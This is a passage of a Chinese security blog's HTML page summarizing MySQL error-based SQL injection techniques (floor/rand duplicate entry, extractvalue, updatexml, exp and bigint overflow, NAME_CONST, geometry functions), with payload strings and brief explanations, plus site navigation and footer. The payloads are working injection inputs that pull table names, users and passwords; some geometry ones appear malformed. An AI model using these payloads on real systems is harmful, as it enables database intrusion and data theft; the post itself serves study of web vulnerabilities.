class="line"></span><br><span class="line">如果关键的表被禁用了，可以使用这种形式</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">如果 rand 被禁用了可以使用用户变量来报错</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(passwo</span><br><span class="line">rd,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="2-Xpath报错-Mysql5-1-5-："><a href="#2-Xpath报错-Mysql5-1-5-：" class="headerlink" title="2.Xpath报错(Mysql5.1.5)："></a>2.Xpath报错(Mysql5.1.5)：</h4><p>以下两个函数都可为xml进行查询修改，最大爆出32位<br>例如（2）通过ExtractValue报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure>
+<p>（3）通过UpdateXml报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>
+<p>这里介绍以下updatexml()语法:<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<h4 id="3-exp报错和整形溢出报错-Mysql-gt-5-5-5-："><a href="#3-exp报错和整形溢出报错-Mysql-gt-5-5-5-：" class="headerlink" title="3.exp报错和整形溢出报错(Mysql&gt;5.5.5)："></a>3.exp报错和整形溢出报错(Mysql&gt;5.5.5)：</h4><p>exp(x):计算e的x次方<br>有两种方法：<br>1.<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">exp进行报错</a>，原理是Exp()超过710会产生溢出。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg payload: <span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure>
+<p>2.<a href="https://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">bigint溢出报错</a>，原理是将0按位取反就会返回“18446744073709551615”，而函数执行成功会返回0，所以将成功执行的函数取反就会得到最大的无符号BIGINT值，从而造成报错。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg payload：!(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x)-~<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>点击上面的方法，可查看讲的很不错的文章。</p>
+<h4 id="4-数据重复报错-低版本-："><a href="#4-数据重复报错-低版本-：" class="headerlink" title="4.数据重复报错(低版本)："></a>4.数据重复报错(低版本)：</h4><p>通过NAME_CONST报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;</span><br></pre></td></tr></table></figure>
+<p>mysql 重复特性，此处重复了 version，所以报错。<br>(拿个小本本记下来，因为只搞到version()就比较鸡肋，求大佬解决)</p>
+<h4 id="5-其他报错注入："><a href="#5-其他报错注入：" class="headerlink" title="5.其他报错注入："></a>5.其他报错注入：</h4><p>通过join报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure>
+<p>通过GeometryCollection()报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure>
+<p>通过polygon ()报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure>
+<p>通过multipoint ()报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
+<p>通过multlinestring ()报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
+<p>通过multpolygon ()报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
+<p>通过linestring ()报错,注入语句如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/03/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title= "文件上传">
+                    <div class="nextTitle">文件上传</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/15/SQL%E6%B3%A8%E5%85%A5/" title= "SQL注入（一）">
+                    <div class="prevTitle">SQL注入（一）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:Y_Y_K@x2.tn" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/yanyouke" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入两大类："><span class="toc-number">1.</span> <span class="toc-text">SQL注入两大类：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">1.1.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于约束的SQL攻击"><span class="toc-number">1.2.</span> <span class="toc-text">基于约束的SQL攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL盲注"><span class="toc-number">1.3.</span> <span class="toc-text">SQL盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注："><span class="toc-number">1.3.1.</span> <span class="toc-text">布尔盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-left-database-1-gt-‘s’"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1. left(database(),1) &gt; ‘s’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-substr-select-database-1-1-‘a’"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">2. substr((select database()),1,1) &#x3D; ‘a’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ascii-ord-mid-函数"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">3. ascii(), ord(), mid()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-regexp正则注入，like匹配注入"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">4. regexp正则注入，like匹配注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注："><span class="toc-number">1.3.2.</span> <span class="toc-text">时间盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-If-ascii-substr-database-1-1-gt-115-0-sleep-5"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1. If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-select-sleep-find-in-set-mid-user-1-1-‘a-w-t-r’-（-user-为root-localhost-）"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2. select sleep(find_in_set(mid(user(), 1, 1), ‘a,w,t,r’));    （ user()为root@localhost ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘M"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3. UNION SELECT IF(SUBSTRING(current,1,1)&#x3D;CHAR(119),BENCHMARK(5000000,ENCODE(‘M</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错盲注："><span class="toc-number">1.3.3.</span> <span class="toc-text">报错盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Duplicate-entry报错："><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1.Duplicate entry报错：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Xpath报错-Mysql5-1-5-："><span class="toc-number">1.3.3.2.</span> <span class="toc-text">2.Xpath报错(Mysql5.1.5)：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-exp报错和整形溢出报错-Mysql-gt-5-5-5-："><span class="toc-number">1.3.3.3.</span> <span class="toc-text">3.exp报错和整形溢出报错(Mysql&gt;5.5.5)：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-数据重复报错-低版本-："><span class="toc-number">1.3.3.4.</span> <span class="toc-text">4.数据重复报错(低版本)：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-其他报错注入："><span class="toc-number">1.3.3.5.</span> <span class="toc-text">5.其他报错注入：</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/14/xml%E6%B3%A8%E5%85%A5/" >xml注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" >文件上传</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/" >SQL注入（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >文件包含</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/15/SQL%E6%B3%A8%E5%85%A5/" >SQL注入（一）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >命令执行</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="web漏洞总结"><span class="iconfont-archer">&#xe606;</span>web漏洞总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web漏洞总结"><span class="iconfont-archer">&#xe60a;</span>web漏洞总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "YYK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
